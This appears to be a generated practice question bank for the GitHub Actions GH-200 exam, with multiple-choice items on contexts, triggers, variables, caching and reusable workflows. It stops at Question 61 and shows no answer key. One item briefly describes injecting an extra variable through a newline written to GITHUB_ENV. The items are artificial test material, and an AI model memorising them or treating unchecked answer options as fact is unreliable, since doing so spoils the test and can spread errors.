# GitHub Actions GH-200 Certification Exam — Question Bank (Iteration 1)

**Iteration**: 1

**Generated**: 2026-03-19

**Total Questions**: 100

**Difficulty Split**: 20 Easy / 60 Medium / 20 Hard

**Answer Types**: 76 `one` / 23 `many` / 1 `none`

---

## Questions

---

### Question 1 — VS Code Extension

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Extension capabilities

**Question**:
What is the primary purpose of the GitHub Actions extension for VS Code?

- A) Execute workflow runs locally using a Docker container
- B) Provide YAML schema validation, IntelliSense, and syntax highlighting for workflow files
- C) Deploy workflow files directly to GitHub without using `git push`
- D) Manage GitHub secrets and environment variables from within the IDE

---

### Question 2 — VS Code Extension

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Context IntelliSense

**Question**:
When a developer types `${{` in a workflow file with the GitHub Actions VS Code extension installed, what happens?

- A) The extension executes the expression against the last workflow run to show its value
- B) The extension triggers autocompletion suggestions for available contexts and their properties
- C) The extension inserts a template snippet for the most recently used expression
- D) The extension opens the GitHub documentation browser for expression syntax

---

### Question 3 — VS Code Extension

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Local validation workflow

**Scenario**:
A developer writes a new workflow file and wants to catch syntax errors before committing to the repository. They have the GitHub Actions VS Code extension installed.

**Question**:
Which capability of the extension directly addresses this need without requiring a workflow run?

- A) The extension runs workflows locally using `act` to validate step outputs
- B) The extension validates the YAML structure and workflow syntax in real time, highlighting errors inline
- C) The extension submits the workflow file to a GitHub-hosted linter API for validation
- D) The extension runs a dry-run of all `run:` steps using a local shell

---

### Question 4 — VS Code Extension

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Action metadata inspection

**Scenario**:
A developer is choosing between `actions/setup-node@v3` and a newer version. They want to see available inputs and outputs without leaving VS Code.

**Question**:
Which extension feature provides this information?

- A) The extension's built-in workflow run history panel showing previous executions
- B) Hovering over the action reference to display its `action.yml` metadata including inputs and outputs
- C) The extension's marketplace browser opens the action's GitHub page automatically
- D) The extension executes a test call to the action to enumerate its interface

---

### Question 5 — Contextual Information

**Difficulty**: Easy
**Answer Type**: one
**Topic**: github context contents

**Question**:
Which of the following is contained in the `github` context?

- A) The current step execution time
- B) The workflow run ID and repository information
- C) The runner's operating system details
- D) The matrix strategy configuration

---

### Question 6 — Contextual Information

**Difficulty**: Easy
**Answer Type**: one
**Topic**: runner context

**Question**:
Which context contains the operating system of the runner executing the current job?

- A) `github.runner_os`
- B) `job.container.image`
- C) `runner.os`
- D) `env.RUNNER_OS`

---

### Question 7 — Contextual Information

**Difficulty**: Medium
**Answer Type**: one
**Topic**: needs context

**Scenario**:
A workflow has a `build` job that sets an output named `image_tag`. A downstream `deploy` job needs to use that tag value.

**Question**:
Which expression correctly accesses the `image_tag` output from the `build` job in the `deploy` job?

- A) `${{ github.outputs.build.image_tag }}`
- B) `${{ steps.build.outputs.image_tag }}`
- C) `${{ needs.build.outputs.image_tag }}`
- D) `${{ job.outputs.image_tag }}`

---

### Question 8 — Contextual Information

**Difficulty**: Medium
**Answer Type**: many
**Topic**: secrets context usage

**Scenario**:
Your team reviews a workflow and finds several usages of the `secrets` context. You need to identify which usages are valid.

**(Select all that apply)**
Which locations in a workflow file can reference the `secrets` context?

- A) `jobs.<job_id>.steps[*].env`
- B) `jobs.<job_id>.steps[*].with`
- C) `jobs.<job_id>.strategy.matrix`
- D) `jobs.<job_id>.steps[*].run` (via expression `${{ secrets.MY_SECRET }}`)

---

### Question 9 — Contextual Information

**Difficulty**: Medium
**Answer Type**: one
**Topic**: matrix context

**Scenario**:
You are running a matrix build across three Node.js versions and two operating systems. A step inside the job needs to reference the current matrix value for `node-version`.

**Question**:
Which expression correctly retrieves the current `node-version` value from the matrix?

- A) `${{ github.matrix.node-version }}`
- B) `${{ strategy.matrix.node-version }}`
- C) `${{ matrix.node-version }}`
- D) `${{ env.MATRIX_NODE_VERSION }}`

---

### Question 10 — Contextual Information

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Context scope and availability

**Scenario**:
You are defining a job-level `if:` condition that should skip a job when the previous job named `lint` failed. You need to construct the condition using the correct contexts.

**(Select all that apply)**
Which expressions are valid in a `jobs.<job_id>.if` condition to check if the `lint` job failed?

- A) `${{ needs.lint.result == 'failure' }}`
- B) `${{ failure() && needs.lint.result == 'failure' }}`
- C) `${{ job.status == 'failure' }}`
- D) `${{ needs.lint.result != 'success' }}`

---

### Question 11 — Context Availability Reference

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Context availability at workflow key

**Question**:
Which contexts are available when evaluating the `run-name` workflow key?

- A) `github`, `env`, `secrets`, `vars`
- B) `github`, `inputs`, `vars`
- C) `github`, `runner`, `job`, `steps`
- D) `github`, `needs`, `matrix`, `strategy`

---

### Question 12 — Context Availability Reference

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Static vs. runtime context evaluation

**Scenario**:
A workflow author wants to use the `runner.os` context in the `jobs.<job_id>.if` condition to skip a job on macOS runners.

**Question**:
Why will this approach fail?

- A) The `runner` context is only available in `steps[*].run`, not at the job `if` level
- B) `runner.os` contains the operating system as a number, not a string
- C) The `if` condition at the job level is evaluated statically before the runner is assigned, so `runner` is unavailable there
- D) Job-level `if` conditions do not support context expressions; only literal boolean values are allowed

---

### Question 13 — Context Availability Reference

**Difficulty**: Medium
**Answer Type**: one
**Topic**: secrets context restrictions

**Scenario**:
A developer tries to set the `runs-on` runner label dynamically using `${{ secrets.RUNNER_LABEL }}` to choose a self-hosted runner based on a secret.

**Question**:
What is the result of this configuration?

- A) The workflow runs on the self-hosted runner whose label matches the secret value
- B) GitHub will mask the runner label in the logs to protect the secret value
- C) The `secrets` context is not available in `jobs.<job_id>.runs-on`; the workflow will fail to parse
- D) GitHub will fall back to the default `ubuntu-latest` runner when a secret is unparseable

---

### Question 14 — Context Availability Reference

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Context availability by workflow key

**Scenario**:
You are analyzing a workflow that uses several context expressions in different locations. You need to identify which of the following are valid based on context availability rules.

**(Select all that apply)**
Which context usage is valid per GitHub's context availability specification?

- A) Using `${{ secrets.DB_PASS }}` in `jobs.<job_id>.steps[*].env`
- B) Using `${{ runner.os }}` in `jobs.<job_id>.runs-on`
- C) Using `${{ needs.setup.outputs.version }}` in `jobs.<job_id>.steps[*].run`
- D) Using `${{ matrix.os }}` in `jobs.<job_id>.strategy.matrix`

---

### Question 15 — Context Availability Reference

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Secret leakage in expressions

**Scenario**:
A workflow step concatenates a secret value into an output variable using a shell command:

```yaml
- name: Store version
  run: echo "version=${{ secrets.APP_VERSION }}-build" >> $GITHUB_OUTPUT
```

**Question**:
What security concern does this approach introduce?

- A) `GITHUB_OUTPUT` does not accept values containing hyphens, causing the step to fail
- B) The secret value is interpolated directly into the shell command string before execution, making it visible in the command log even if GitHub masks the literal value
- C) Secrets written to `GITHUB_OUTPUT` are permanently stored in plaintext and accessible after the workflow ends
- D) Using `${{ secrets.* }}` inside a `run:` step automatically triggers a security alert in GitHub Advanced Security

---

### Question 16 — Workflow File Structure

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Workflow file location

**Question**:
Where must GitHub Actions workflow files be stored in a repository to be recognized and executed?

- A) In the `actions/` directory at the repository root
- B) In the `.github/workflows/` directory
- C) In any directory, as long as files end with `.workflow.yml`
- D) In `.github/` directly, not in a subdirectory

---

### Question 17 — Workflow File Structure

**Difficulty**: Easy
**Answer Type**: one
**Topic**: jobs vs steps

**Question**:
What is the key difference between a `job` and a `step` in a GitHub Actions workflow?

- A) Jobs run in sequence by default; steps run in parallel
- B) Jobs run on separate runners and can run in parallel; steps run sequentially on the same runner within a job
- C) Steps can have `if` conditions; jobs cannot
- D) Jobs share the same file system; steps each get an isolated environment

---

### Question 18 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: permissions key

**Scenario**:
Your workflow releases a package and must push a Git tag. The workflow fails with a 403 permissions error when attempting to push. The workflow uses the default `GITHUB_TOKEN`.

**Question**:
Which change correctly resolves this error?

- A) Add `token: ${{ secrets.GITHUB_TOKEN }}` to the `actions/checkout` step
- B) Add `permissions: contents: write` at the job or workflow level
- C) Replace `GITHUB_TOKEN` with a PAT stored in `secrets.PERSONAL_TOKEN`
- D) Add `allow-pushes: true` to the `on.push` event configuration

---

### Question 19 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: many
**Topic**: YAML anchors and aliases

**Scenario**:
Your workflow repeats the same three environment setup steps across four jobs. You want to eliminate the duplication using YAML features.

**(Select all that apply)**
Which YAML features can be used within a single workflow file to reduce this repetition?

- A) YAML anchors (`&anchor-name`) to define a reusable block
- B) YAML aliases (`*anchor-name`) to reference the defined block elsewhere
- C) YAML merge key (`<<:`) to merge an anchored mapping into another mapping
- D) YAML `$include` directive to import another file's content

---

### Question 20 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: service containers

**Scenario**:
A workflow needs to run integration tests against a PostgreSQL database. The database must be ready before the test step runs.

**Question**:
Which workflow feature is the correct way to provide a PostgreSQL instance for the test job?

- A) Add a separate job that installs PostgreSQL and exports a connection string as an output
- B) Use `jobs.<job_id>.services` to declare a PostgreSQL container that GitHub starts before the job steps
- C) Include a step that runs `docker run postgres` before the test step
- D) Set `needs: [postgres]` to reference a PostgreSQL job defined earlier in the workflow

---

### Question 21 — Workflow File Structure

**Difficulty**: Hard
**Answer Type**: one
**Topic**: matrix strategy combinatorics

**Scenario**:
A workflow defines the following matrix:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [18, 20, 22]
    include:
      - os: ubuntu-latest
        node: 18
        experimental: true
```

**Question**:
How many total jobs does this matrix produce?

- A) 5 (the `include` replaces one of the base combinations)
- B) 6 (3 base combinations per OS × 2 = 6; `include` adds no new job)
- C) 7 (6 base combinations + 1 new job from `include`)
- D) 8 (include creates an additional ubuntu-latest job beyond the base)

---

### Question 22 — Workflow File Structure

**Difficulty**: Hard
**Answer Type**: many
**Topic**: fail-fast and max-parallel

**Scenario**:
Your matrix produces 12 jobs. You want no more than 4 jobs to run at a time, and a failure in one job must not cancel the remaining jobs.

**(Select all that apply)**
Which strategy settings accomplish both goals?

- A) `fail-fast: false`
- B) `max-parallel: 4`
- C) `continue-on-error: true` on each step
- D) `fail-fast: true` with `max-parallel: 4`

---

### Question 23 — Workflow Trigger Events

**Difficulty**: Easy
**Answer Type**: one
**Topic**: schedule trigger

**Question**:
Which trigger event is used to run a workflow on a recurring time-based schedule?

- A) `on: timer`
- B) `on: cron`
- C) `on: schedule`
- D) `on: workflow_dispatch`

---

### Question 24 — Workflow Trigger Events

**Difficulty**: Easy
**Answer Type**: one
**Topic**: workflow_dispatch inputs

**Question**:
Which trigger enables a workflow to be started manually from the GitHub UI or via the REST API, with optional user-provided inputs?

- A) `repository_dispatch`
- B) `workflow_call`
- C) `workflow_dispatch`
- D) `manual`

---

### Question 25 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: push vs pull_request event differences

**Scenario**:
Your team needs a CI workflow that runs only when a pull request is opened, synchronized (new commits pushed), or reopened against the `main` branch. The workflow should NOT run on direct pushes to `main`.

**Question**:
Which trigger configuration is correct?

- A) `on: push: branches: [main]`
- B) `on: pull_request: branches: [main]`
- C) `on: pull_request_review: branches: [main]`
- D) `on: push: branches-ignore: [main]`

---

### Question 26 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: paths filtering

**Scenario**:
You want a build workflow to trigger only when files inside the `src/` directory or the `package.json` file are changed on a push to any branch.

**Question**:
Which trigger configuration is correct?

```yaml
on:
  push:
    # ??? filter goes here
```

- A) `branches: ['src/**', 'package.json']`
- B) `paths: ['src/**', 'package.json']`
- C) `files: ['src/**', 'package.json']`
- D) `filter: paths: ['src/**', 'package.json']`

---

### Question 27 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: repository_dispatch vs workflow_dispatch

**Scenario**:
An external CI system needs to trigger a GitHub Actions workflow programmatically. The external system does not have a GitHub UI — it only makes HTTP calls to the GitHub REST API.

**Question**:
Which trigger event is designed for this use case?

- A) `workflow_dispatch` — designed for manual/human-initiated runs; also supports API triggering but requires specifying a `ref` and optional typed inputs
- B) `push` with a script that commits a file to trigger the workflow
- C) `repository_dispatch` with a custom event type sent to the GitHub API
- D) `schedule` polling the external system at regular intervals

---

### Question 28 — Workflow Trigger Events

**Difficulty**: Hard
**Answer Type**: one
**Topic**: schedule event limitations

**Scenario**:
A security scan workflow runs on a `schedule` trigger every morning. A developer notices that the workflow's `github.event` context does not contain commit information about the latest changes.

**Question**:
Which statement correctly explains this behavior?

- A) Scheduled workflows run on a detached HEAD and require `fetch-depth: 0` to access commit history
- B) The `schedule` event does not produce an event payload with commit information; `github.event` is empty for scheduled runs
- C) `github.event` is only available in the `steps` context, not at the job level where the developer was inspecting it
- D) Scheduled workflow runs cache the `github.event` from the most recent manual trigger, not the latest commit

---

### Question 29 — Workflow Trigger Events

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Multi-event trigger with filtering

**Scenario**:
You need a workflow that triggers on:
- Pushes to `main` or `release/**` branches when any `.py` file changes
- New or updated pull requests targeting `main`

**(Select all that apply)**
Which are required in the `on:` block to correctly implement both triggers independently?

- A) A `push` event with `branches: [main, 'release/**']` and `paths: ['**/*.py']`
- B) A `pull_request` event with `branches: [main]` and `types: [opened, synchronize, reopened]`
- C) A `push` event with `paths-ignore: ['**/*.md']` to exclude documentation
- D) A `schedule` event to handle cases where neither push nor PR fires

---

### Question 30 — Custom Environment Variables

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Environment variable scope

**Question**:
At which scopes can custom environment variables be defined in a GitHub Actions workflow?

- A) Only at the workflow level using the top-level `env:` key
- B) At the workflow, job, and step levels using `env:` at each respective level
- C) Only at the step level; workflow-level variables must use `GITHUB_ENV`
- D) At the workflow and job levels only; steps inherit from the job

---

### Question 31 — Custom Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: GITHUB_OUTPUT for passing values between steps

**Scenario**:
A step in a job computes a version string and needs to make it available to subsequent steps in the same job.

**Question**:
Which approach is correct for passing the value to subsequent steps?

- A) `export VERSION=1.2.3` — set a shell variable; subsequent steps inherit it automatically
- B) `echo "VERSION=1.2.3" >> $GITHUB_ENV` — sets an environment variable available from the next step onward
- C) `echo "version=1.2.3" >> $GITHUB_OUTPUT` — sets a step output that subsequent steps access via `steps.<step_id>.outputs.version`
- D) Both B and C are correct; they differ only in how downstream steps access the value

---

### Question 32 — Custom Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Variable override precedence

**Scenario**:
A workflow defines `LOG_LEVEL: info` at the workflow level. A specific job redefines `LOG_LEVEL: debug`. A specific step within that job also defines `LOG_LEVEL: trace`.

**Question**:
What value does `LOG_LEVEL` hold during execution of that step?

- A) `info` — workflow-level variables always take precedence
- B) `debug` — job-level variables override workflow-level variables
- C) `trace` — step-level variables override job-level and workflow-level variables
- D) All three values are concatenated: `info:debug:trace`

---

### Question 33 — Custom Environment Variables

**Difficulty**: Hard
**Answer Type**: one
**Topic**: GITHUB_ENV security considerations

**Scenario**:
A workflow step downloads a JSON response from a third-party API and uses the value in `GITHUB_ENV`:

```yaml
- name: Set version from API
  run: |
    VERSION=$(curl -s https://api.example.com/version | jq -r .tag)
    echo "DEPLOY_VERSION=$VERSION" >> $GITHUB_ENV
```

**Question**:
What security risk does this introduce?

- A) Values written to `GITHUB_ENV` are automatically redacted in logs, hiding debugging information
- B) If the API response contains a newline followed by `ANOTHER_VAR=malicious`, it could inject an additional variable into the environment via `GITHUB_ENV`
- C) `curl` calls made from workflow steps are blocked by GitHub's egress firewall by default
- D) The `jq` utility is not available on GitHub-hosted runners and the step will fail silently

---

### Question 34 — Custom Environment Variables

**Difficulty**: Medium
**Answer Type**: many
**Topic**: GITHUB_STEP_SUMMARY

**Scenario**:
Your workflow runs a test suite and you want to display a formatted Markdown summary of the test results directly in the workflow run summary page on GitHub.

**(Select all that apply)**
Which approaches correctly write content to the workflow job summary?

- A) `echo "## Test Results" >> $GITHUB_STEP_SUMMARY`
- B) `echo "| Test | Status |" >> $GITHUB_STEP_SUMMARY`
- C) `echo "summary=Test passed" >> $GITHUB_OUTPUT`
- D) `printf "**All tests passed**\n" >> $GITHUB_STEP_SUMMARY`

---

### Question 35 — Default Environment Variables

**Difficulty**: Easy
**Answer Type**: one
**Topic**: GITHUB_SHA

**Question**:
Which default environment variable contains the full 40-character SHA of the commit that triggered the workflow?

- A) `GITHUB_REF`
- B) `GITHUB_COMMIT`
- C) `GITHUB_SHA`
- D) `GITHUB_HEAD_SHA`

---

### Question 36 — Default Environment Variables

**Difficulty**: Easy
**Answer Type**: one
**Topic**: CI flag

**Question**:
Which default environment variable is automatically set to `true` in every GitHub Actions workflow run, allowing tools to detect they are running in a CI environment?

- A) `GITHUB_CI`
- B) `CI`
- C) `ACTIONS_CI`
- D) `RUNNER_CI`

---

### Question 37 — Default Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: RUNNER_DEBUG

**Scenario**:
A workflow step fails intermittently and the standard logs do not provide enough detail to diagnose the issue. You want to enable verbose debug logging for the next run without modifying the workflow file.

**Question**:
What is the correct approach?

- A) Add `debug: true` to the failing step's `with:` inputs
- B) Set the repository secret `ACTIONS_RUNNER_DEBUG` to `true` or set `ACTIONS_STEP_DEBUG` to `true`
- C) Add `verbose: true` to the workflow-level `env:` block
- D) Enable the `--debug` flag in the `gh` CLI command used to trigger the run

---

### Question 38 — Default Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: GITHUB_REF format

**Scenario**:
A workflow triggered by a push to the `release/1.5` branch needs to extract just the branch name (without the `refs/heads/` prefix) for use in a deployment script.

**Question**:
Which default environment variable or context already provides the branch/tag name without the `refs/heads/` or `refs/tags/` prefix?

- A) `GITHUB_REF`
- B) `GITHUB_REF_NAME`
- C) `GITHUB_BASE_REF`
- D) `GITHUB_HEAD_REF`

---

### Question 39 — Default Environment Variables

**Difficulty**: Hard
**Answer Type**: none
**Topic**: GITHUB_TOKEN usage

**Question**:
Which of the following statements about the `GITHUB_TOKEN` default environment variable is FALSE?

- A) `GITHUB_TOKEN` is automatically provisioned at the start of each job and revoked when the job ends
- B) `GITHUB_TOKEN` can be used to trigger a new workflow run in the same repository
- C) `GITHUB_TOKEN` permissions can be restricted at the job level using the `permissions:` key
- D) `GITHUB_TOKEN` scope is limited to the current repository and cannot access other repositories

---

### Question 40 — Environment Protection Rules

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Required reviewers

**Question**:
What happens when a workflow job references a GitHub environment that has "Required reviewers" configured?

- A) The job runs immediately but posts a notification to reviewers after completion
- B) The job pauses before accessing the environment's resources until a designated reviewer approves
- C) The job is rejected automatically and must be re-triggered by an approved reviewer
- D) The job runs on a restricted runner pool managed by the nominated reviewers

---

### Question 41 — Environment Protection Rules

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Deployment branch policies

**Scenario**:
Your `production` environment is configured with a deployment branch policy that only allows deployments from branches matching `release/*` or the `main` branch. A developer attempts to deploy from a feature branch named `feature/hotfix`.

**Question**:
What occurs when the workflow reaches the job that references the `production` environment?

- A) The job runs but environment-specific secrets are not injected
- B) The job is skipped silently with status `skipped`
- C) GitHub blocks the deployment with an error indicating the branch does not match the allowed deployment branches policy
- D) The job falls back to using the `staging` environment if defined

---

### Question 42 — Environment Protection Rules

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Wait timers

**Scenario**:
Your organization wants a mandatory 10-minute delay between when a deployment is approved and when it actually executes. This allows on-call engineers to monitor alerting dashboards before traffic shifts.

**Question**:
Which environment protection rule implements this behavior?

- A) Set a `timeout-minutes: 10` on the deployment job
- B) Add a `sleep 600` command as the first step in the deployment job
- C) Configure a **wait timer** of 10 minutes in the environment protection rules settings
- D) Add a `schedule` trigger that delays the deployment by 10 minutes

---

### Question 43 — Environment Protection Rules

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Environment protection rules combinations

**Scenario**:
Your organization is designing governance controls for a `production` environment. Security requires that: (1) at least two named engineers approve before any deployment, (2) deployments are only allowed from the `main` branch, and (3) there is a 5-minute delay after approval before execution.

**(Select all that apply)**
Which environment protection rule settings must be configured to meet all three requirements?

- A) Required reviewers with 2 specific users selected
- B) Deployment branches policy configured to allow only `main`
- C) A wait timer of 5 minutes
- D) An IP allow list restricting deployment origins

---

### Question 44 — Environment Protection Rules

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Environment secrets scope

**Scenario**:
A workflow has three jobs: `test`, `build`, and `deploy`. Only the `deploy` job references the `production` environment. The `test` job attempts to access `secrets.PROD_DB_PASSWORD`, which is defined as an environment-level secret on `production`.

**Question**:
What is the result?

- A) The `test` job fails with a secret not found error
- B) `secrets.PROD_DB_PASSWORD` evaluates to an empty string in the `test` job because the environment is not referenced there
- C) GitHub automatically promotes environment secrets to the job level when the variable name starts with `PROD_`
- D) The `test` job inherits all secrets from `production` because they share the same workflow run

---

### Question 45 — Workflow Artifacts

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Artifact default retention

**Question**:
What is the default retention period for artifacts uploaded to GitHub Actions if no `retention-days` is specified?

- A) 7 days
- B) 30 days
- C) 90 days
- D) 365 days

---

### Question 46 — Workflow Artifacts

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Upload artifact action

**Scenario**:
A workflow `build` job compiles a binary to the `dist/` directory. The subsequent `deploy` job needs to access this binary.

**Question**:
Which step sequence correctly makes the binary available to the `deploy` job?

- A) In `build`: set `GITHUB_OUTPUT` with the file path; in `deploy`: use the output to locate the file on a shared runner disk
- B) In `build`: use `actions/upload-artifact` to upload `dist/`; in `deploy`: use `actions/download-artifact` with the matching artifact name
- C) In `build`: use `actions/cache` with `dist/` as the path; in `deploy`: restore the cache with the same key
- D) In `build`: push the binary to a branch; in `deploy`: checkout that branch to access the binary

---

### Question 47 — Workflow Artifacts

**Difficulty**: Medium
**Answer Type**: many
**Topic**: Artifact reliability between jobs

**Scenario**:
Your CI pipeline uploads test results and build binaries in a `build` job. A downstream `deploy` job downloads them. The deploy job intermittently reports that artifact downloads are empty or incomplete.

**(Select all that apply)**
Which actions would improve artifact reliability between jobs?

- A) Add `if: always()` to the upload step so artifacts are uploaded even on failure
- B) Pin `actions/upload-artifact` and `actions/download-artifact` to matching major versions
- C) Set `retention-days: 90` to prevent early expiration during long-running pipelines
- D) Replace `path: .` with a specific glob pattern targeting only required output files

---

### Question 48 — Workflow Artifacts

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Artifact storage limits

**Scenario**:
Your organization's monthly artifact storage bill is unexpectedly high. Investigation reveals workflows store large test report archives for every pull request run, and the default retention period is applied.

**Question**:
Which is the most effective solution to reduce storage costs while keeping test reports accessible for active PRs?

- A) Disable artifact uploads for all pull request runs using `if: github.event_name != 'pull_request'`
- B) Compress artifacts before uploading and specify `retention-days: 5` on test report uploads for PR runs
- C) Increase runner memory so test reports are stored in RAM instead of uploaded as artifacts
- D) Use `actions/cache` instead of `actions/upload-artifact` because cache storage is free and unlimited

---

### Question 49 — Workflow Caching

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Cache key construction

**Question**:
In the `actions/cache` action, what is the purpose of the `key` parameter?

- A) It names the cache entry and is used to identify an exact cache hit on restore
- B) It specifies the encryption key used to protect cached files
- C) It defines the cache invalidation policy (TTL) in days
- D) It is used only for cache deletion via the REST API, not during workflow runs

---

### Question 50 — Workflow Caching

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cache restore keys

**Scenario**:
A Node.js project caches `node_modules` with the primary key `npm-${{ hashFiles('package-lock.json') }}`. On a branch where `package-lock.json` has changed, the primary key won't match. You want the run to fall back to the most recent cache rather than starting cold.

**Question**:
Which configuration accomplishes this?

- A) Set `fail-on-cache-miss: false` to allow an empty cache restoration
- B) Add `restore-keys: npm-` so any cache entry with the `npm-` prefix is used as a fallback
- C) Set a second `path:` pointing to a backup cache location
- D) Use a separate `actions/cache/restore` step with `key: npm-latest` after the primary cache step

---

### Question 51 — Workflow Caching

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cache scope

**Scenario**:
A developer working on a feature branch notices their workflow is slower than on `main` because the npm cache isn't being reused. The `main` branch has a warm cache with the same `package-lock.json`.

**Question**:
What is the cache sharing behavior between branches?

- A) Caches are fully isolated per-branch; feature branches can never access caches from `main`
- B) A branch can restore caches created on the default branch (e.g., `main`) or the branch that triggered the base ref, making `main`'s caches accessible to feature branches
- C) Caches created on any branch are globally available to all branches in the repository
- D) Feature branches can only access caches if the `permissions: cache: read` scope is added

---

### Question 52 — Workflow Caching

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Cache invalidation strategies

**Scenario**:
You are designing a caching strategy for a Python project. You want the cache to be invalidated when either `requirements.txt` or `setup.py` changes, but shared across all branches when the dependencies are identical.

**(Select all that apply)**
Which cache key designs meet these requirements?

- A) `key: py-${{ hashFiles('requirements.txt', 'setup.py') }}`
- B) `key: py-${{ github.sha }}` (invalidates on every commit)
- C) `key: py-${{ hashFiles('requirements.txt') }}-${{ hashFiles('setup.py') }}`
- D) `key: py-${{ github.ref }}-${{ hashFiles('requirements.txt') }}`

---

### Question 53 — Workflow Sharing

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Reusable workflow trigger

**Question**:
Which trigger event must a reusable workflow define to allow it to be called from another workflow?

- A) `workflow_dispatch`
- B) `repository_dispatch`
- C) `workflow_call`
- D) `workflow_run`

---

### Question 54 — Workflow Sharing

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Calling a reusable workflow

**Scenario**:
Your repository calls a reusable workflow located at `org/shared-workflows/.github/workflows/build.yml` on the `main` branch. The reusable workflow requires an input named `environment` and a secret named `DEPLOY_TOKEN`.

**Question**:
Which `uses` and `with`/`secrets` syntax is correct?

- A) `uses: org/shared-workflows/build.yml@main` with `with.environment:` and `secrets.DEPLOY_TOKEN:`
- B) `uses: org/shared-workflows/.github/workflows/build.yml@main` with `with: environment:` and `secrets: DEPLOY_TOKEN:`
- C) `uses: org/shared-workflows@main` and reference input as `inputs.environment`
- D) `uses: ./.github/workflows/build.yml` with `with: environment:` (only local reusable workflows are supported)

---

### Question 55 — Workflow Sharing

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Reusable workflow outputs

**Scenario**:
A reusable workflow runs a build and needs to return a `build_id` value to the calling workflow.

**Question**:
Which mechanism allows a reusable workflow to expose outputs to the calling workflow?

- A) The reusable workflow sets `GITHUB_OUTPUT` in a step; the calling workflow accesses it via `env.build_id`
- B) The reusable workflow defines `on.workflow_call.outputs` with values mapped from its job outputs; the caller accesses them via `needs.<job>.outputs.build_id`
- C) Outputs are automatically inherited by the calling workflow from all completed steps in the reusable workflow's jobs
- D) The reusable workflow must write the value to an artifact; the calling workflow then downloads and reads the artifact

---

### Question 56 — Workflow Sharing

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Workflow status badges and secrets inheritance

**Scenario**:
A team asks two questions: (1) How do we add a workflow status badge to the README? (2) Can secrets defined in the calling workflow be passed to the reusable workflow automatically?

**(Select all that apply)**
Which statements correctly answer both questions?

- A) A workflow status badge URL follows the format: `https://github.com/<owner>/<repo>/actions/workflows/<workflow-file>.yml/badge.svg`
- B) Secrets from the calling workflow are automatically inherited by the reusable workflow without explicit passing
- C) To pass a secret to a reusable workflow, the caller must explicitly map it under `secrets:` in the `with` block or use `secrets: inherit`
- D) The badge reflects the status of the last run on the default branch unless a `?branch=` query parameter is added

---

### Question 57 — Workflow Debugging

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Enabling debug logs

**Question**:
Which secret or variable must be set to `true` to enable runner diagnostic logging for a GitHub Actions workflow run?

- A) `GITHUB_DEBUG`
- B) `ACTIONS_RUNNER_DEBUG`
- C) `RUNNER_VERBOSE`
- D) `GITHUB_ACTIONS_DEBUG`

---

### Question 58 — Workflow Debugging

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Workflow commands for debugging

**Scenario**:
A workflow step should print a warning message that appears as an annotation in the GitHub UI, associated with a specific file and line number for easy navigation.

**Question**:
Which workflow command produces a warning annotation linked to a file?

- A) `echo "::warning file=app.py,line=42::Deprecated function used"`
- B) `echo "##[warning] app.py line 42: Deprecated function used"`
- C) `echo "WARN: app.py:42: Deprecated function used" >> $GITHUB_STEP_SUMMARY`
- D) `gh workflow annotate --level=warning --file=app.py --line=42`

---

### Question 59 — Workflow Debugging

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Identifying slow steps

**Scenario**:
A workflow that previously completed in 8 minutes now takes 20 minutes. No workflow file changes were made. You need to identify which step is responsible for the slowdown.

**Question**:
Which built-in GitHub Actions feature helps identify the slow step most directly?

- A) Enable `ACTIONS_STEP_DEBUG` to dump timing for every step command
- B) Open the workflow run logs and expand each step; each step's log header shows its elapsed time
- C) Use the REST API to diff the workflow run duration between the current and a previous run
- D) Add a `date` command before and after the suspected step to manually time it

---

### Question 60 — Workflow Debugging

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Debug techniques for intermittent failures

**Scenario**:
A workflow fails intermittently with no obvious error message. The failure occurs in a step that calls an external service. You need to diagnose whether the issue is transient network connectivity or a logic error.

**(Select all that apply)**
Which diagnostic approaches are appropriate?

- A) Enable `ACTIONS_STEP_DEBUG` to capture verbose step command output for the next failing run
- B) Add workflow commands such as `::group::` and `::endgroup::` around the failing step to improve log readability
- C) Add a step that uses `curl -v` to test connectivity to the external service before the main step
- D) Replace the failing step with a `while true; do sleep 1; done` loop to keep the runner alive for SSH debugging

---

### Question 61 — Workflows REST API

**Difficulty**: Easy
